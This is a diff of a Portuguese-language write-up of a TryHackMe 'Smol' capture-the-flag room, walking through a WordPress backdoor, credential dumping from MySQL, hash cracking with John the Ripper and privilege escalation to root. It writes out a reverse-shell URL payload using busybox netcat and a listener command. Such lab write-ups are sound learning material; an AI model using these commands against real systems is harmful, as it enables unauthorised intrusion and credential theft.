@@ -139,10 +139,10 @@ Vamos testar a execução de código:
 
 Conseguimos utilizar o backdoor com sucesso para execução de código remoto.
 
-## Exfiltrando o banco de dados
+## Exfiltrando credenciais do banco de dados
 
 Agora que temos RCE, vamos pegar uma shell na máquina:
-(Eu tenho usado bastante o busybox para invocar o netcat, nessas rooms ele geralmente está se mostrando o mais consistente pra mim.)
+(Eu tenho usado bastante o busybox para invocar o netcat, nessas rooms ele geralmente está presente e dá certo com frequência)
 
 no site: `http://www.smol.thm/wp-admin.php/about.php?cmd=busybox nc <ip> <porta> -e sh` 
 
@@ -150,8 +150,70 @@ na máquina: `nc -lvnp <porta>`
 
 ![250603_14h15m31s_screenshot](https://github.com/user-attachments/assets/d09a8e46-e28f-4070-bb29-c853e76ea494)
 
+Agora que temos a shell na máquina, vamos tentar nos conectar ao MySQL usando as credenciais que pegamos na configuração do wp-config.php
+
+![250603_14h17m55s_screenshot](https://github.com/user-attachments/assets/4507e13f-f691-41b8-a7ac-26699e28cd0e)
+
+Conseguimos acesso aos nomes dos usuários e às hashes das senhas.
+
+![250603_14h17m41s_screenshot](https://github.com/user-attachments/assets/96e3b0e1-4b20-44af-af05-30b9d98190d6)
 
 
+Vamos copiar essas informações para nossa máquina e tentar quebrar as hashes utilizando o John the Ripper.
+
+Após preparar as hashes para quebra, as deixando no formato nome do usuário:hash.
+
+![250603_14h20m04s_screenshot](https://github.com/user-attachments/assets/153af751-02bd-4230-8663-bd42a0c6180a)
+
+## Flag do user
+
+Conseguimos quebrar a hash do usuário diego
+
+![250603_11h26m12s_screenshot](https://github.com/user-attachments/assets/7f42eef5-e1e1-425c-ae2c-b06c4214cd59)
+
+Trocando de usuário na nossa shell reversa
+
+![250603_14h52m37s_screenshot](https://github.com/user-attachments/assets/bd274264-9608-438a-a31c-bdc7fca94107)
+
+Flag de user encontrada. 
+
+## PrivEsc
+
+O gurpo do usuário diego tem privilégios para acesso às pastas dos outros usuários, então vamos ver o que encontramos:
+
+![250603_14h53m19s_screenshot](https://github.com/user-attachments/assets/7505dc3e-2569-4ff2-81d5-d6bd49690e80)
+
+Conseguimos copiar a chave ssh do usuário think.
+
+### Think
+
+O Think também faz parte do grupo, e depois de enumerar o básico, fiquei perdido sem saber o que fazer. Precisei de uma dica e me perguntaram se eu havia tentado trocar de usuário sem utilizar a senha. 
+Não tinha pensado nisso, por mais básico que seja. O usuário think consegue mudar de conta para gege sem utilizar senha.
+
+![250603_15h00m23s_screenshot](https://github.com/user-attachments/assets/482e271a-e0eb-40e9-963c-80c2dd4800e0)
 
 
+Agora podemos transferir o arquivo para nossa máquina e realizar a análise
+
+O arquivo precisa de senha para ser extraído, tentei utilizar a senha do wpuser e não funcionou, então vamos usar um utilitário do John para ver se conseguimos quebrar essa senha:
+
+![250603_15h07m00s_screenshot](https://github.com/user-attachments/assets/4574b28c-3c16-4794-bafd-14792c3381a7)
+
+
+Conseguimos a senha do arquivo: hero_gege@hotmail.com - agora podemos extrair ele.
+
+![250603_15h07m41s_screenshot](https://github.com/user-attachments/assets/220dbb0d-9400-4fe1-8e05-e6bff2405fa6)
+
+A pasta contém um arquivo wp-config que contém a senha do usuário xavi.
+
+Trocamos para esse usuário e vemos que ele tem permissões de sudo, então bastou usar o sudo su e rootamos a máquina.
+
+
+![250603_15h17m05s_screenshot](https://github.com/user-attachments/assets/78aa930c-f669-4e4e-bb51-a9731a3fc376)
+
+### Conclusão
+
+Gostei muito dessa máquina, apesar de não ser muito fã das que envolvem processos de quebra de hash ou brute force, essa foi bem legal.
+Em alguns momentos eu caí numas tocas de coelho bem feias - principalmente na hora de encontrar o arquivo hello.php e na escalação de privilégios.
+Particularmente na PrivEsc, eu acho que essa seção ficou um pouco corrida, mas eu fiquei tanto tempo dando murro em ponta de faca que acabei pulando pra só incluir as soluções aqui mesmo. Talvez depois eu revise pra adicionar algumas das outras coisas que eu tentei sem sucesso.
 
